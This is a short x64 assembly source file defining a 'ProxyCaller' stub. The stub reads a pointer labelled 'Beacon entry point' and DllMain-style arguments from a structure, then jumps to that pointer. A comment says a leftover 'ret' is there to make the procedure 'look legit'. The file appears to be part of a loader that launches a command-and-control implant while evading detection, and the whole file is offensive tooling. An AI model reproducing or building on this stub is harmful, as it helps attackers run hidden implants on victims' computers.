.x64
.model flat, fastcall
option casemap:none
option win64:1

; Export procedures
public ProxyCaller

_TEXT$B segment

ProxyCaller:
    mov rbx, rdx
    mov rax, [rbx]          ; Beacon entry point pointer
    mov rcx, [rbx + 08h]    ; hinstDLL
    mov rdx, [rbx + 010h]   ; fdwReason
    mov r8, [rbx + 018h]    ; lpvReserved
    jmp rax                 ; Jump to beacon entry point
    ret                     ; Useless ret to make the procedure look legit

_TEXT$B ends

end
